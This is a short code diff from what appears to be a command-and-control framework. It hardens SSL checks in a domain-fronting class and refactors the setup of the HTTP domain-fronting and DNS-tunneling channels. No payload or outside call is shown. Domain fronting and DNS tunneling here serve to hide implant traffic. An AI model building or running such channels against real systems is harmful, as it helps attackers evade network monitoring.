@@ -280,8 +280,11 @@ class DomainFronter:
             request = self.create_request(endpoint, method, data)
             
             # Create SSL context
+            # Create SSL context (Hardened)
             if self.verify_ssl:
                 context = ssl.create_default_context()
+                context.check_hostname = True
+                context.verify_mode = ssl.CERT_REQUIRED
             else:
                 context = ssl.create_default_context()
                 context.check_hostname = False
@@ -622,22 +625,20 @@ class C2Channel:
     
     def _setup_protocol(self) -> None:
         """Setup protocol-specific components"""
-        if self.config.protocol in (C2Protocol.HTTP, C2Protocol.HTTPS):
-            if self.config.fronting_domain and self.config.actual_host:
-                self.domain_fronter = DomainFronter(
-                    self.config.fronting_domain,
-                    self.config.actual_host,
-                    self.config.primary_port
-                )
+        if self.config.protocol in (C2Protocol.HTTP, C2Protocol.HTTPS) and self.config.fronting_domain and self.config.actual_host:
+            self.domain_fronter = DomainFronter(
+                self.config.fronting_domain,
+                self.config.actual_host,
+                self.config.primary_port
+            )
         
-        elif self.config.protocol == C2Protocol.DNS:
-            if self.config.dns_domain:
-                self.dns_tunneler = DNSTunneler(
-                    self.config.dns_domain,
-                    subdomain_length=self.config.subdomain_length_length
-                    if hasattr(self.config, 'subdomain_length_length')
-                    else self.config.dns_subdomain_length
-                )
+        elif self.config.protocol == C2Protocol.DNS and self.config.dns_domain:
+            self.dns_tunneler = DNSTunneler(
+                self.config.dns_domain,
+                subdomain_length=self.config.subdomain_length_length
+                if hasattr(self.config, 'subdomain_length_length')
+                else self.config.dns_subdomain_length
+            )
     
     def connect(self) -> bool:
         """
